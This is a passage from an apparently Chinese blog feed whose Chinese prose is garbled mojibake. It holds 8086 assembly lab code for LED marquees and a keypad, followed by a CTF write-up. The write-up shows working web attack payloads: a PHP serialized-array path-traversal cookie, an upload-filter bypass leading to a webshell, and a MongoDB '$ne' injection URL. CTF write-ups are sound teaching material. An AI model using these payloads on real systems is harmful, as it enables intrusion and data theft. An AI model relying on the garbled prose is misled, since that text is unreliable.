      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å®éªŒè¯´ç®€å•ä¸ç®€å•è¯´éš¾ä¹Ÿä¸éš¾ã€‚ã€‚æœ€ä¸»è¦æ˜¯è‡ªå·±ç†è®ºä¸æ‰å®ï¼Œå¾—è®°å½•ï¼Œæ˜¨å¤©æŠŠå®‰æ’6æœˆèµ›çš„wpå†™å®Œå¤´ç–¼ï¼Œäºæ˜¯å°±æ”¾åˆ°ä»Šå¤©èµ¶è„šå†™ä¸€å†™ï¼Œæ³¨æ„çš„ç‚¹éƒ½åœ¨ä»£ç çš„æ³¨é‡Šé‡Œé¢æ ‡ç€ï¼Œè¶ç€è‡ªå·±è¿˜è®°å¾—emmm<br><a id="more"></a></p><h3 id="è·‘é©¬ç¯ç¡¬ä»¶å»¶æ—¶"><a href="#è·‘é©¬ç¯ç¡¬ä»¶å»¶æ—¶" class="headerlink" title="è·‘é©¬ç¯ç¡¬ä»¶å»¶æ—¶"></a>è·‘é©¬ç¯ç¡¬ä»¶å»¶æ—¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">PORT_CTL EQU 283H</span><br><span class="line">PORT_A EQU 280H</span><br><span class="line">PORT_B EQU 281H</span><br><span class="line">PORT_C EQU 282H</span><br><span class="line"></span><br><span class="line">;8255çš„æ§åˆ¶ç«¯å£</span><br><span class="line">;8255çš„Aå£æ¥çš„æ˜¯8253çš„è¾“å‡º</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">ASSUME CS:CODE</span><br><span class="line">START:</span><br><span class="line">MOV AL,00110111B;  TO:2A0H T1:2A1H T2:2A2H   é€šé“0åˆå§‹åŒ–å†™å…¥æ§åˆ¶å­—</span><br><span class="line">MOV DX,2A3H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,2A0H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,50H</span><br><span class="line">MOV DX,2A0H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">MOV AL,01110111B</span><br><span class="line">MOV DX,2A3H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,2A1H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,4H       </span><br><span class="line">MOV DX,2A1H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;ä¸Šé¢è¿™ä¸€éƒ¨åˆ†æ˜¯å¯¹8253çš„æ§åˆ¶ï¼Œåˆ†åˆ«å¯¹0å’Œ1å£è¿›è¡Œè¾“å…¥è®¡æ•°å€¼ï¼Œå¯¹æ§åˆ¶å£è¾“å…¥æ§åˆ¶å­—</span><br><span class="line"></span><br><span class="line">MOV DX,PORT_CTL</span><br><span class="line">MOV AL,10010000B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV BL,01H  ;äº®ç¯çš„ä¿¡å·</span><br><span class="line"></span><br><span class="line">TEST_IT:</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H</span><br><span class="line">JNZ ON1</span><br><span class="line">;æ³¨æ„è¿™é‡Œçš„é€»è¾‘é¡ºåºï¼Œä¸ä¸º0çš„æ—¶å€™æ˜¯èµ°ON2çš„ï¼Œä¸èƒ½å…ˆå†™ON1ï¼Œä¸ç„¶è·‘é©¬ç¯çš„é€»è¾‘å°±ä¼šå‡ºé”™ï¼Œå°±ä¼šå˜æˆä¸è®ºåˆ¤æ–­ä¸å¦éƒ½æ˜¯æ‰§è¡ŒON1</span><br><span class="line">ON2:  </span><br><span class="line">MOV AL,BL</span><br><span class="line">MOV DX,PORT_B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H      ;è¯»å–æœ€åä¸€ä½çš„å€¼æ¥åˆ¤æ–­æ˜¯å¦åœ¨è·³åŠ¨</span><br><span class="line">JZ ON2            ;æ³¨æ„è¿™ç§åœ°æ–¹çš„é€»è¾‘åˆ¤æ–­</span><br><span class="line">ROL BL,01</span><br><span class="line">JMP TEST_IT</span><br><span class="line"></span><br><span class="line">ON1:</span><br><span class="line">MOV AL,BL</span><br><span class="line">MOV DX,PORT_B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H</span><br><span class="line">JNZ ON1             ;æ³¨æ„è¿™ç§åœ°æ–¹çš„é€»è¾‘åˆ¤æ–­</span><br><span class="line">ROL BL,01</span><br><span class="line">JMP TEST_IT      </span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br><span class="line">;END STARTä¸€å®šè¦åŠ ä¸ç„¶çš„è¯ä¹Ÿä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure><p>é€šè¿‡é«˜ä½ç”µé¢‘çš„åˆ‡æ¢æ•ˆæœï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸Šæ¬¡çš„è½¯ä»¶å®ç°åŒä»å¾ªç¯æ¥å»¶æ—¶</p><h3 id="è·‘é©¬ç¯è½¯ä»¶å»¶æ—¶"><a href="#è·‘é©¬ç¯è½¯ä»¶å»¶æ—¶" class="headerlink" title="è·‘é©¬ç¯è½¯ä»¶å»¶æ—¶"></a>è·‘é©¬ç¯è½¯ä»¶å»¶æ—¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">;ç«¯å£åœ°å€</span><br><span class="line">PORTA  EQU 280H</span><br><span class="line">PORTB EQU 281H</span><br><span class="line">PORTC EQU 282H</span><br><span class="line">PORT_CRO EQU 283H</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">   ASSUME CS:CODE</span><br><span class="line">        </span><br><span class="line">START:MOV AL,82H</span><br><span class="line">MOV DX ,PORT_CRO</span><br><span class="line"> OUT DX, AL</span><br><span class="line">   MOV AL,01H</span><br><span class="line">MOV DX,PORTA</span><br><span class="line">;åŒæ ·æ˜¯ä¸Šé¢æ˜¯å¯¹äº8255ç«¯å£çš„æ“ä½œï¼ŒAå£ä½œä¸ºè¾“å‡ºå£</span><br><span class="line">GO:</span><br><span class="line">OUT DX,AL</span><br><span class="line">ROL AL,1 ;ä¸‹é¢å°±å¼€å§‹ä½¿ç”¨åŒé‡å¾ªç¯å»¶æ—¶ï¼Œç›¸å½“äºç§»ä½ä¹‹åï¼Œå°±ä¸€ç›´åœåœ¨é‚£ä¸€ä½ç­‰</span><br><span class="line">      MOV BX, 16EAH</span><br><span class="line">DELAY1:</span><br><span class="line">MOV CX, 16EAH</span><br><span class="line">DELAY: </span><br><span class="line">LOOP DELAY</span><br><span class="line">DEC BX</span><br><span class="line">JNZ DELAY1</span><br><span class="line">JMP GO</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸Šé¢ä¸¤ä¸ªè·‘é©¬ç¯çš„å®éªŒï¼Œä¸åŒä¹‹å¤„å°±æ˜¯å»¶æ—¶éƒ¨åˆ†çš„æ“ä½œå•Š</p><h3 id="4-4é”®ç›˜è¾“å…¥"><a href="#4-4é”®ç›˜è¾“å…¥" class="headerlink" title="4*4é”®ç›˜è¾“å…¥"></a>4*4é”®ç›˜è¾“å…¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">  ;ç«¯å£åœ°å€</span><br><span class="line">PORT_A EQU 280H          ;8255 Aå£åœ°å€</span><br><span class="line">PORT_B EQU 281H           ;8255 Bå£åœ°å€</span><br><span class="line">PORT_C EQU 282H           ;8255 Cå£åœ°å€</span><br><span class="line">PORT_CTL EQU 283H   </span><br><span class="line"></span><br><span class="line">;æ•°æ®æ®µï¼Œé”®ç›˜æ‰«æç è¡¨</span><br><span class="line">DATA SEGMENT</span><br><span class="line">;         0    1    2     3     4      5     6     7</span><br><span class="line">KEY_TABLE DB  77H, 7BH , 7DH, 7EH, 0B7H, 0BBH, 0BDH, 0BEH</span><br><span class="line">;         8      9     A     B     C      D E F</span><br><span class="line">      DB  0D7H, 0DBH, 0DDH, 0DEH , 0E7H, 0EBH, 0EDH, 0EEH</span><br><span class="line">;ä¸ƒæ®µç </span><br><span class="line">;                0    1    2    3    4     5    6     7</span><br><span class="line">SEVEN_TABLE DB   3FH, 06H, 5BH, 4FH, 66H, 6DH, 7DH, 07H</span><br><span class="line">  ;               8     9   A   B   C   D    E     F</span><br><span class="line">             DB   7FH,6FH,77H,7CHï¼Œ39h, 5EH, 79h,  71h, 0ffh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;ä»£ç æ®µ</span><br><span class="line">CODE SEGMENT</span><br><span class="line">     ASSUME CS:CODE,DS:DATA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line">  MOV AX, DATA</span><br><span class="line">  MOV DS, AX</span><br><span class="line">  ;åˆå§‹åŒ–8255A,  æ–¹å¼0  Bå£è¾“å…¥  Aï¼ŒCå£è¾“å‡º</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  MOV DX, PORT_CTL ;æŒ‡å‘æ§åˆ¶å­—</span><br><span class="line">  MOV AL, 82H ;æ§åˆ¶å­—</span><br><span class="line">  OUT DX, AL          ;å†™å…¥æ§åˆ¶å­—</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;æ£€æµ‹å¼€å§‹</span><br><span class="line">;å‘æ‰€æœ‰è¡Œé€0</span><br><span class="line">Go:</span><br><span class="line">  MOV DX, PORT_A   ;Aå£</span><br><span class="line">  MOV AL, 00H</span><br><span class="line">  OUT DX, AL ;å‘Aå£è¾“å‡º0</span><br><span class="line"></span><br><span class="line">;è¯»åˆ—ï¼ŒæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰é”®å‡æ¾å¼€</span><br><span class="line">  MOV DX, PORT_B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WAIT_OPEN:</span><br><span class="line">  IN AL, DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL,0FH</span><br><span class="line">  JNE WAIT_OPEN  </span><br><span class="line"></span><br><span class="line">;æ˜¯å¦æœ‰é”®å‹ä¸‹</span><br><span class="line">WAITP:</span><br><span class="line">  IN AL,DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL,0FH</span><br><span class="line">  JZ WAITP</span><br><span class="line"></span><br><span class="line">;æœ‰é”®å‹ä¸‹ï¼Œå»¶æ—¶20msï¼Œæ¶ˆé™¤æŠ–åŠ¨</span><br><span class="line">  MOV CX, 16EAH</span><br><span class="line">DELAY:</span><br><span class="line">  LOOP DELAY</span><br><span class="line"></span><br><span class="line">;æŸ¥åˆ—ï¼Œçœ‹é”®æ˜¯å¦ä»ç„¶è¢«å‹ç€</span><br><span class="line">  IN AL, DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL, 0FH</span><br><span class="line">  JE WAITP</span><br><span class="line"></span><br><span class="line">  MOV AL, 0FEH</span><br><span class="line">  MOV CL, AL</span><br><span class="line"></span><br><span class="line">NEXTR:</span><br><span class="line">  MOV DX, PORT_A</span><br><span class="line">  OUT DX, AL</span><br><span class="line">  MOV DX ,PORT_B</span><br><span class="line">  IN AL, DX </span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL, 0FH</span><br><span class="line">  JNE ENCODE</span><br><span class="line">  ROL CL, 01</span><br><span class="line">  MOV AL,CL</span><br><span class="line">  JMP NEXTR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENCODE:</span><br><span class="line">  MOV BX, 000FH</span><br><span class="line">  IN AL, DX</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEXT_TRY:</span><br><span class="line">  CMP AL, KEY_TABLE[BX]</span><br><span class="line">  JE DONE</span><br><span class="line">  DEC BX</span><br><span class="line">  JNS NEXT_TRY</span><br><span class="line">  MOV AH, 01</span><br><span class="line">  JMP EXIT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DONE:</span><br><span class="line">  MOV AL, BL</span><br><span class="line">  LEA BX, SEVEN_TABLE;</span><br><span class="line">  XLAT</span><br><span class="line">  MOV DX, PORT_C</span><br><span class="line">  OUT DX, AL</span><br><span class="line">  JMP Go </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIT:</span><br><span class="line">  HLT</span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª4*4è¯´æ¥å°±å¾ˆæ°´ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†æŠ„çš„ä¹¦ï¼Œåªæ˜¯æœ€åé‚£é‡Œæ¢äº†æŸ¥ä¸ƒæ®µè¡¨è€Œå·²</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>1.å„ç§æ§åˆ¶å­—æ®µè®°å¾—è¿˜ä¸å¤Ÿç†Ÿæ‚‰ï¼Œæœ‰æ—¶è¿˜æ˜¯éœ€è¦ç¿»ä¹¦ã€‚ã€‚<br>2.å„ç§å™¨ä»¶çš„åå­—åŠåŠŸèƒ½åŸç†è®°å¾—ä¹Ÿä¸ç‰¢å›ºï¼Œæ˜¨å¤©ç¿»ä¹¦å‘ç°åŸç†çš„éƒ¨åˆ†ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ¬ ç¼ºçš„<br>3.ç¡¬ä»¶æ–¹é¢ä¸è¡Œï¼Œè½¯ä»¶æ–¹é¢ä¹Ÿä¸è¡Œï¼Œæ±‡ç¼–è¯­è¨€è¿˜æ˜¯ä¸å¤Ÿç†Ÿç»ƒï¼Œç‰¹åˆ«æ˜¯å¯¹äºé€»è¾‘åˆ¤æ–­å’Œè·³è½¬é¡ºåºçš„ç¼–å†™ï¼Œä¸‹æ¬¡è¦ä¸æŠŠ<code>74ls138</code>ç«¯å£æ¢ä¸€æ¢ï¼Ÿåœ¨å°è¯•è‡ªå·±å†™ã€‚ã€‚è¯´æ¥è¯´å»éƒ½æ˜¯è‡ªå·±ç†è®ºçŸ¥è¯†ä¸æ‰å®ï¼Œä¸‹åˆèµ¶ç´§æ‰¾æ—¶é—´å»æ¶è¡¥äº†</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> å¾®æœºå®éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
            <tag> å¾®æœºå®éªŒ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’6æœˆèµ›éƒ¨åˆ†åšé¢˜è®°å½•</title>
      <link href="/anheng-6month.html"/>
      <url>/anheng-6month.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡æ¯”èµ›æ°é€¢åˆ«çš„å­¦æ ¡è€ƒè¯•ï¼Œæ„Ÿè§‰é¢˜ç›®æœ‰ç‚¹æ°´ï¼Œä½†è¿˜æ˜¯å¾—è®°å½•ä¸€ä¸‹<br><a id="more"></a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="Web1-Mynote"><a href="#Web1-Mynote" class="headerlink" title="Web1 Mynote"></a>Web1 Mynote</h3><p>è¿™é“é¢˜ç›®ä¸€å¼€å§‹æˆ‘æ­»æ‰£xsså‘ç°æ— è·¯å¯å¾ªåé¢ç»åˆ«äººå°å°æé†’ä¹‹åï¼ŒåŸæ¥æ˜¯ä¸ªç‚’é¸¡å¼±æ™ºçš„ååºåˆ—åŒ–é¢˜ç›®ï¼Œä¸å¤šè¯´<br>ä¸Šå›¾ï¼Œåœ¨<code>robots.txt</code>é‡Œé¢å‘ç°å‡ ä¸ªå¯ç–‘çš„é¡µé¢ï¼Œå¯èƒ½æœ‰ç”¨å…ˆè®°å½•ç€ï¼Œç›´æ¥è®¿é—®<code>flag.php</code>æ˜¯ä¸ªå‡çš„flagã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/06/23/P9MVuq.png" alt="P9MVuq.png"></p><p>ç»è¿‡åˆ«äººçš„æç¤ºï¼Œæ˜¯ååºåˆ—åŒ–ä»¥åï¼Œå¤šæŠ“å‡ ä¸ªåŒ…çœ‹ä¸€ä¸‹<br>åœ¨<code>uploadé¡µé¢</code>ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åè¿”å›æŸ¥çœ‹å›¾ç‰‡çš„é¡µé¢å‘ç°é‡Œé¢å¤šäº†ä¸€ä¸ªå…³äº<code>picture</code>å‚æ•°çš„<code>cookie</code><br><img src="https://s1.ax1x.com/2018/06/23/P9MebV.png" alt="P9MebV.png"></p><p>è§£ç å‘ç°æ˜¯ä¸ª<code>jsonæ ¼å¼</code>çš„ä¸œè¥¿<br><a href="https://imgchr.com/i/P9MuUU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MuUU.md.png" alt="P9MuUU.md.png"></a><br>è¿™å°±è·Ÿååºåˆ—åŒ–è”ç³»èµ·æ¥äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹çš„ååºåˆ—åŒ–ä½†ç›´æ¥ååºåˆ—åŒ–ä¼šæœ‰æŠ¥é”™ï¼Œå¦‚ä¸‹<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>å‘ç°æ˜¯åœ¨å½“å‰ç›®å½•ç”¨çš„å‡½æ•°è¯»å–é¡µé¢ï¼Œäºæ˜¯å°±è¦ç›®å½•ç©¿è¶Šä¸€æ³¢ï¼Œäºæ˜¯ä¾¿æœ‰äº†ä¸‹é¢çš„æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> $a[] = <span class="string">'../../controllers/Basecontrol.php'</span>;</span><br><span class="line"> $b[] = <span class="string">'../../flag.php'</span>;</span><br><span class="line"> $c[] = <span class="string">'../../controllers/User.php'</span>;</span><br><span class="line"> $d[] = <span class="string">'../../controllers/Controllers.php.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span><br></pre></td></tr></table></figure><p>æŠŠä»–ä»¬ä¸€ä¸ªä¸ªå¼„åˆ°<code>picture</code>çš„<code>cookie</code>é‡Œé¢ï¼ŒæŠŠå›æ˜¾å‡ºæ¥çš„<code>base64ç¼–ç </code>ä¸€ééè§£ç ï¼Œå¾—åˆ°æºç ï¼Œèµ·åˆä¸€ç›´ä»¥ä¸ºåç»­è¿˜è¦ä»£ç å®¡è®¡ã€‚ã€‚ã€‚ç»“æœè§£ç flag.phpçš„æºç çš„æ—¶å€™å‡ºç°äº†çœŸçš„<code>flag</code>ã€‚ã€‚ã€‚ã€‚ã€‚å°¼ç›å‘çˆ¹ï¼Œéƒ½åšå¥½å®¡è®¡å‡†å¤‡äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;This_1S_A_F4ke_f1aG&#125;"</span>;</span><br></pre></td></tr></table></figure><p>ä»¥åçœ‹æ¥è¦å‹¤æŠ“åŒ…</p><h3 id="Web2-ezupload"><a href="#Web2-ezupload" class="headerlink" title="Web2 ezupload"></a>Web2 ezupload</h3><p>ç®€å•çš„ä¸Šä¼ é¢˜ç›®<br>å…ˆéšæ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œé‚£æˆ‘å°±ç”¨copyå‘½ä»¤å¼„ä¸€ä¸ªå›¾ç‰‡é©¬ä¸Šå»<br>ä¸Šä¼ å‘ç°<br><img src="https://s1.ax1x.com/2018/06/23/P9MQC4.png" alt="P9MQC4.png"><br>å‡ºç°è·¯å¾„ï¼Œç½‘é¡µå¯ä»¥æ‰“å¼€ï¼Œä½†è¿™ä¸ªåç¼€åæœ‰ç‚¹å¥‡æ€ªäºæ˜¯æˆ‘ç»§ç»­å°è¯•æ”¹åç¼€åä¸º<code>phtml</code>,å‘ç°åç§°åˆå˜æˆäº†<code>pegml</code><br><img src="https://s1.ax1x.com/2018/06/23/P9M129.png" alt="P9M129.png"><br>äºæ˜¯çŒœæµ‹æ˜¯å¦å¯èƒ½æ˜¯ä¹‹è¿‡æ»¤å‰ä¸‰ä¸ªå­—æ¯åç¼€åï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨<code>Apache</code>çš„ç‰¹æ€§è®©ä»–æ‰§è¡Œphpä»£ç ï¼Œäºæ˜¯æˆ‘æŠŠåç¼€åå†æ”¹ä¸º<code>phtml.php</code>,è¿™æ¬¡çš„åç¼€åå˜æˆ<code>pegml.php</code>å‰é¢çš„ä¸œè¥¿<code>Apache</code>è‚¯å®šä¸è®¤å¾—ï¼Œåªèƒ½ä¹–ä¹–æ‰§è¡ŒPHPäº†ã€‚ã€‚<br>äºæ˜¯è¿ä¸€ä¸‹èœåˆ€æˆåŠŸ<br><a href="https://imgchr.com/i/P9M3vR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9M3vR.md.png" alt="P9M3vR.md.png"></a></p><h3 id="Web3-never-give-up"><a href="#Web3-never-give-up" class="headerlink" title="Web3 never give up"></a>Web3 never give up</h3><p>è¿™ä¸ªé¢˜ç›®æ˜¯<code>mongdbæ³¨å…¥</code>ï¼Œå¥½åƒå¤§ç¥ä»¬éƒ½åšè¿‡å•Šï¼Œå°±æˆ‘è¿™æ¸£æ¸£æ²¡è§è¿‡ã€‚ã€‚ã€‚ã€‚ç›´æ¥è´´å›¾<br><img src="https://s1.ax1x.com/2018/06/23/P9MJDx.png" alt="P9MJDx.png"></p><p>æŸ¥çœ‹é¡µé¢åŸä»£ç å‘ç°å‡ ä¸ªé¡µé¢æœ‰<code>titleå‚æ•°</code>ï¼Œå°±æ˜¯ä»–äº†<br><code>payload</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10000/?title[$ne]=1</span><br></pre></td></tr></table></figure></p><p>åŸå› å¥½åƒæ˜¯$neè¿™ä¸ªä¸œè¥¿æœ‰ç¼ºé™·ï¼Œ<br>æ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ,ä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸ,ä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶<br>å› ä¸º<code>$ne</code>æ˜¯<code>MongoDB</code>ç”¨æ¥åˆ¤å®šæ¡ä»¶æ˜¯å¦ä¸ç›¸ç­‰çš„,æ‰€ä»¥å®ƒä¼šæŸ¥è¯¢ç™»å½•é›†åˆä¸­çš„æ‰€æœ‰ç”¨æˆ·åç§°ä¸ç­‰äº1ä¸”å¯†ç ä¹Ÿä¸ç­‰äº1çš„è®°å½•ã€‚å› æ­¤,æœ¬æ¬¡æŸ¥è¯¢å°†è¿”å›ç™»å½•é›†åˆä¸­çš„æ‰€æœ‰ç”¨æˆ·ã€‚æ¢æˆSQLçš„è¡¨è¿°æ³•,å°±ç­‰åŒäºä»¥ä¸‹æŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username &lt;&gt;   <span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">password</span> &lt;&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" 